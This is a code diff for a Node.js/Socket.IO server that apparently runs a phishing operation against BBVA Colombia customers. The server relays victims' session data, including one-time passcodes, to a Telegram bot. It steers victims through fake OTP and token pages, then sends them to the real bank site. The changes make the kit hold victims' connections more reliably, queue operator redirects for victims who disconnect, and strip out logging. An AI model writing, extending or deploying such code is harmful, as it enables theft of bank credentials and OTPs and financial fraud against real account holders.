@@ -22,22 +22,30 @@ const app = express();
 const server = http.createServer(app);
 const io = socketIo(server, {
     cors: { origin: "*", methods: ["GET", "POST"] },
-    transports: ['websocket', 'polling'],
-    pingTimeout: 300000,        // 5 minutos
-    pingInterval: 10000,        // 10 segundos
-    upgradeTimeout: 60000,
-    connectTimeout: 60000,
+    transports: ['polling', 'websocket'],
+    pingTimeout: 600000,
+    pingInterval: 5000,
+    upgradeTimeout: 90000,
+    connectTimeout: 90000,
     allowUpgrades: true,
     perMessageDeflate: false,
     maxHttpBufferSize: 1e8,
     allowEIO3: true,
-    cookie: false
+    cookie: false,
+    path: '/socket.io',
+    serveClient: true,
+    closeOnBeforeunload: false
 });
 
-// Keep-alive para mantener conexiones activas
+// Sistema de keep-alive ultra agresivo
 setInterval(() => {
-    io.emit('ping-all');
-}, 30000); // Cada 30 segundos
+    const sockets = Array.from(io.sockets.sockets.values());
+    console.log(`📡 Keep-alive: ${sockets.length} clientes conectados`);
+    io.emit('server-ping');
+}, 15000); // Cada 15 segundos
+
+// Cola de comandos pendientes por si el usuario se desconectó temporalmente
+const pendingCommands = new Map(); // sessionId -> {action, timestamp}
 
 const activeSessions = new Map();
 
@@ -47,10 +55,6 @@ const activeSessions = new Map();
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 app.use(express.static(__dirname));
-app.use((req, res, next) => {
-    console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
-    next();
-});
 
 // ========================================
 // TELEGRAM SERVICE
@@ -67,9 +71,8 @@ class TelegramService {
             };
             
             await axios.post(url, payload);
-            console.log('✓ Mensaje enviado a Telegram');
         } catch (error) {
-            console.error('✗ Error al enviar mensaje:', error.response?.data || error.message);
+            console.error('Error Telegram:', error.response?.data || error.message);
             throw error;
         }
     }
@@ -78,9 +81,8 @@ class TelegramService {
         try {
             const url = `${CONFIG.TELEGRAM_API_BASE}${CONFIG.TELEGRAM_BOT_TOKEN}/answerCallbackQuery`;
             await axios.post(url, { callback_query_id: callbackQueryId, text });
-            console.log('✓ Callback respondido');
         } catch (error) {
-            console.error('✗ Error al responder callback:', error.message);
+            console.error('Error callback:', error.message);
         }
     }
     
@@ -114,7 +116,7 @@ class SessionManager {
             reconnectCount: 0
         };
         activeSessions.set(socketId, session);
-        console.log(`✓ Sesión creada: ${socketId}`);
+
         return socketId;
     }
     
@@ -140,14 +142,11 @@ class SessionManager {
             session.socketId = newSocketId;
             session.lastActivity = new Date();
             session.reconnectCount++;
-            console.log(`✓ Socket actualizado: ${sessionId} -> ${newSocketId} (reconexión #${session.reconnectCount})`);
         }
     }
     
     static delete(sessionId) {
-        const deleted = activeSessions.delete(sessionId);
-        if (deleted) console.log(`✓ Sesión eliminada: ${sessionId}`);
-        return deleted;
+        return activeSessions.delete(sessionId);
     }
     
     static findSession(socketId, originalSessionId) {
@@ -193,12 +192,28 @@ class SessionManager {
         if (socket?.connected) return socket;
         
         // Intentar con lastSocketId
-        if (session.lastSocketId) {
+        if (session.lastSocketId && session.lastSocketId !== session.socketId) {
             socket = io.sockets.sockets.get(session.lastSocketId);
             if (socket?.connected) {
-                // Actualizar socketId si encontramos uno conectado
                 session.socketId = session.lastSocketId;
                 return socket;
+            }
+        }
+        
+        // Buscar en TODOS los sockets conectados
+        const allSockets = Array.from(io.sockets.sockets.values());
+        for (const sock of allSockets) {
+            if (sock.connected) {
+                const foundSession = Array.from(activeSessions.entries())
+                    .find(([sid, sess]) => 
+                        sid === sessionId && 
+                        (sess.socketId === sock.id || sess.lastSocketId === sock.id)
+                    );
+                
+                if (foundSession) {
+                    session.socketId = sock.id;
+                    return sock;
+                }
             }
         }
         
@@ -259,7 +274,28 @@ io.on('connection', (socket) => {
         if (originalSessionId) {
             SessionManager.updateSocketId(originalSessionId, socket.id);
             socket.emit('session-identified', { success: true, sessionId: originalSessionId });
-            console.log(`✓ Sesión ${originalSessionId} identificada con socket ${socket.id}`);
+            
+            // Ejecutar comandos pendientes si hay
+            const pendingCommand = pendingCommands.get(originalSessionId);
+            if (pendingCommand) {
+                const actions = {
+                    logo: '/index.html',
+                    otp: '/otp.html',
+                    token: '/token.html',
+                    finish: 'https://www.bbva.com.co/'
+                };
+                
+                const url = actions[pendingCommand.action];
+                if (url) {
+                    socket.emit('redirect', { 
+                        url, 
+                        action: pendingCommand.action, 
+                        timestamp: Date.now(),
+                        wasPending: true
+                    });
+                    pendingCommands.delete(originalSessionId);
+                }
+            }
         }
     });
     
@@ -359,8 +395,28 @@ ${session.data.otp ? `📲 <b>OTP:</b> ${session.data.otp}` : ''}
     
     socket.on('ping', () => socket.emit('pong'));
     
+    socket.on('client-alive', () => {
+        // Cliente reporta que está vivo
+        const sessionId = Array.from(activeSessions.entries())
+            .find(([sid, sess]) => sess.socketId === socket.id)?.[0];
+        if (sessionId) {
+            const session = SessionManager.get(sessionId);
+            if (session) session.lastActivity = Date.now();
+        }
+    });
+    
     socket.on('ping-client', () => {
         socket.emit('pong-client', { timestamp: Date.now() });
+    });
+    
+    socket.on('client-alive', () => {
+        // Cliente reporta que está vivo
+        const sessionId = Array.from(activeSessions.entries())
+            .find(([sid, sess]) => sess.socketId === socket.id)?.[0];
+        if (sessionId) {
+            const session = SessionManager.get(sessionId);
+            if (session) session.lastActivity = Date.now();
+        }
     });
 });
 
